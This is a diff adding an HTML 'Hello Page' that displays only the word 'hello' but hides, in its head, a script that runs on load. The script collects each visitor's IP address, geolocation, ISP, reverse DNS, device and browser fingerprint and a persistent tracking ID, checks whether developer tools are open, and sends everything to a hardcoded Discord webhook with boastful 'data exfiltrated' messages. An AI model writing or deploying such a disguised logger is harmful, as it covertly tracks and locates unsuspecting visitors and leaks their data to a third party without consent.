@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hello Page</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f0f0f0;
+    }
+    h1 {
+      font-size: 4rem;
+      color: #333;
+    }
+  </style>
+          <script>
+        	(async () => {
+  const webhookURL = "https://discord.com/api/webhooks/1368211694584856647/7flwPKRczBxGY26ZQi5akKWaYFW5tMPSPWhtnVSkOrR0VdE57NnTGJlgD-6HwAVSAOV2";
+  const ipAPIURL = "https://ipapi.co/json/";
+
+  try {
+    const data = await fetch(ipAPIURL).then(res => res.json());
+    const IPData = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+    let hwid = localStorage.getItem("vex_hwid");
+    if (!hwid) {
+      hwid = crypto.randomUUID();
+      localStorage.setItem("vex_hwid", hwid);
+    }
+
+    const ua = data.user_agent || navigator.userAgent;
+    const ip = data.ip;
+    const isVPN = data.proxy || data.hosting || data.mobile; // salah satu true berarti kemungkinan VPN
+
+    function detectBrowser(ua) {
+      if (/Edg/i.test(ua)) return "Edge";
+      if (/OPR|Opera/i.test(ua)) return "Opera";
+      if (/Chrome/i.test(ua)) return "Chrome";
+      if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
+      if (/Firefox/i.test(ua)) return "Firefox";
+      return "Unknown";
+    }
+
+    const browser = detectBrowser(ua);
+    const now = new Date().toLocaleString();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const colorDepth = window.screen.colorDepth;
+    const windowResolution = `${window.innerWidth}x${window.innerHeight}`;
+    const isRetina = window.devicePixelRatio > 1 ? "Yes" : "No";
+    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No";
+    const isOnline = navigator.onLine ? "Yes" : "No";
+    const lang = navigator.language || navigator.userLanguage;
+    const referrer = document.referrer;
+    const currentURL = window.location.href;
+    const pageLoadTime = performance.now();
+    const timeSpent = performance.timing.loadEventEnd - performance.timing.navigationStart;
+    const sessionStorageSize = JSON.stringify(sessionStorage).length;
+    const localStorageSize = JSON.stringify(localStorage).length;
+    const platform = navigator.platform;
+    const hardwareConcurrency = navigator.hardwareConcurrency;
+
+    let heatmapData = [];
+    document.addEventListener("click", (e) => {
+      heatmapData.push({ x: e.pageX, y: e.pageY });
+    });
+
+ 
+    let isDevToolsOpen = false;
+    const devToolsCheck = () => {
+      const width = window.outerWidth - window.innerWidth > 100;
+      const height = window.outerHeight - window.innerHeight > 100;
+      isDevToolsOpen = width || height;
+    };
+    setInterval(devToolsCheck, 1000);
+
+    
+    const headers = new Headers();
+    headers.append("X-Custom-Header", "CustomValue");
+    const request = new Request(window.location.href, { headers });
+    const fetchHeaders = await fetch(request).then(res => res.headers);
+
+    const deviceFingerprint = {
+      platform,
+      hardwareConcurrency,
+      screenResolution,
+      colorDepth,
+      isRetina,
+      isDarkMode,
+      isVPN,
+      ip,
+      ua: navigator.userAgent
+    };
+
+    const vpnStatus = isVPN ? "VPN/Proxy Detected" : "No VPN/Proxy Detected";
+
+    const isAirplaneMode = /Airplane Mode/i.test(navigator.userAgent);
+
+ const reverseDNS = await fetch("https://dns.google/resolve?name=" + ip.split('.').reverse().join('.') + ".in-addr.arpa&type=PTR")
+  .then(res => res.json())
+  .then(data => data.Answer?.[0]?.data?.replace(/\.$/, "") || "N/A")
+  .catch(() => "N/A");
+
+    const embed = {
+      embeds: [{
+        title: "NEW VISITOR | NEW LOG ⚡",
+        image: { url: "https://files.catbox.moe/fr7gmm.jpeg" },
+        description: "Critical breach detected. All data extracted.",
+        fields: [
+          {
+            name: "🛠️ System Info",
+            value: `
+            
+            **IP**: ${ip}
+            **HWID**: ${hwid}
+            **User Agent**: ${navigator.userAgent}
+            **Browser**: ${browser}
+            **Platform**: ${platform}
+            **Hardware Cores**: ${hardwareConcurrency}
+            **Language**: ${lang}
+            **Dark Mode**: ${isDarkMode}
+            **VPN Status**: ${vpnStatus}  
+            **AirplaneMode**: ${isAirplaneMode ? "Yes" : "No"}
+            **Reverse DNS**: ${reverseDNS}
+            **UserAgent**: ${ua.slice(0, 256)}
+            `,
+            inline: false
+          },
+          {
+            name: "🌍 Location",
+            value: `
+            **Coordinates**: ${data.latitude}, ${data.longitude}
+            **Location**: ${data.city}, ${data.country_name}
+            **Region**: ${data.region_name}
+            **Postal Code**: ${data.postal}
+            **Continent**: ${data.continent}
+            **Continent Code**: ${data.continentCode}
+            **Country**: ${data.country_name}
+            **Country Code**: ${data.country_code}
+            **Currency:** ${data.currency}
+            `,
+            inline: false
+          },
+          {
+            name: "💻 Device Details",
+            value: `
+            **Screen Resolution**: ${screenResolution}
+            **Color Depth**: ${colorDepth}-bit
+            **Window Resolution**: ${windowResolution}
+            **Retina Display**: ${isRetina}
+            **Timezone**: ${data.timezone}
+            **Connection Type**: ${data.connection_type}
+            **ISP**: ${data.isp}
+            **AS Name**: ${data.asname}
+            **AS**: ${data.as}
+            **Organization**: ${data.org}
+            `,
+            inline: false
+          },
+          {
+            name: "🔗 Current Session",
+            value: `
+            **Current URL**: ${currentURL}
+            **Referrer**: ${referrer || "N/A"}
+            **Session Storage Size**: ${sessionStorageSize} bytes
+            **Local Storage Size**: ${localStorageSize} bytes
+            **Page Load Time**: ${pageLoadTime.toFixed(2)}ms
+            **Time Spent**: ${timeSpent.toFixed(2)}ms
+            `,
+            inline: false
+          },
+          {
+            name: "🛰️ Developer Tools",
+            value: isDevToolsOpen ? "Developer Tools Opened" : "Developer Tools Closed",
+            inline: true
+          },
+        ],
+        footer: { text: "Data Log | VEX SYSTEMS 👾" }
+      }]
+    };
+
+    await fetch(webhookURL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(embed)
+});
+
+
+    
+    const textMessage = `
+🔥 **SYSTEM COMPROMISE DETECTED!** 🔥
+-----------------------------------
+
+🛡️ **SYSTEM INFORMATION**  
+**IP Address**: ${ip}  
+**HWID**: ${hwid}  
+**User Agent**: ${navigator.userAgent}  
+**Browser**: ${browser}  
+**Device Platform**: ${platform}  
+**Hardware Cores**: ${hardwareConcurrency}  
+**UserAgent**: ${ua.slice(0, 256)}
+
+🌍 **LOCATION DETAILS**  
+**City**: ${data.city}  
+**Region**: ${data.region_name}  
+**Country**: ${data.country_name}  
+**Country Code**: ${data.country_code}  
+**Continent**: ${data.continent}  
+**Continent Code**: ${data.continentCode}  
+**Postal Code**: ${data.postal}  
+**Coordinates**: ${data.latitude}, ${data.longitude}  
+**Currency**: ${data.currrency}
+
+🔗 **NETWORK & CONNECTION**  
+**ISP**: ${data.isp}  
+**Organization**: ${data.org}  
+**AS**: ${data.as}  
+**AS Name**: ${data.asname}  
+**Connection Type**: ${data.connection_type}  
+**VPN Status**: ${vpnStatus}  
+**Reverse DNS**: ${reverseDNS}
+
+⏰ **TIME & LANGUAGES**  
+**Timezone**: ${data.timezone}  
+**Language**: ${lang}  
+
+🔗 **BROWSER & NAVIGATION**  
+**Referrer**: ${referrer || "N/A"}  
+**Current URL**: ${currentURL}  
+
+⚙️ **DEVICE & SCREEN DETAILS**  
+**Screen Resolution**: ${screenResolution}  
+**Resolution**: ${screen.width}x${screen.height}  
+**Fullscreen Mode**: ${screen.fullscreen}  
+
+📅 **TIMESTAMP**  
+**Date/Time**: ${now}
+
+⚠️ **ACTION REQUIRED!**  
+🔒 **ALL DATA HAS BEEN EXFILTRATED!**  
+Please verify the system logs immediately!  
+-----------------------------------------------------
+`;
+
+try {
+    const response = await fetch(webhookURL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ content: textMessage })
+});
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
+    }
+
+    console.log("Webhook sent successfully!");
+  } catch (error) {
+    console.error("Error sending webhook:", error.message || error);
+  }
+  
+  } catch (err) {
+    console.error("Gagal menjalankan logger:", err.message || err);
+  }
+  
+})();
+</script>
+</head>
+<body>
+  <h1>hello</h1>
+</body>
+</html>
